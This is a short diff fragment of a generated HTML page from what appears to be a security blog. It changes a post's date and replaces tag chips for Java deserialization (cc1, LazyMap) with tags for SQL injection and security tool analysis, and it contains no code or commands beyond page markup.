+                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-10
                             </span>
                         <span class="publish-author">
                             
@@ -778,16 +778,12 @@ ChainedTransformer#transform()<span aria-hidden="true" class="line-numbers-rows"
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/java/">
-                        <span class="chip bg-color">java</span>
+                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">SQL注入</span>
                     </a>
                     
-                    <a href="/tags/cc1/">
-                        <span class="chip bg-color">cc1</span>
-                    </a>
-                    
-                    <a href="/tags/LazyMap/">
-                        <span class="chip bg-color">LazyMap</span>
+                    <a href="/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/">
+                        <span class="chip bg-color">安全工具分析</span>
                     </a>
                     
                 </div>
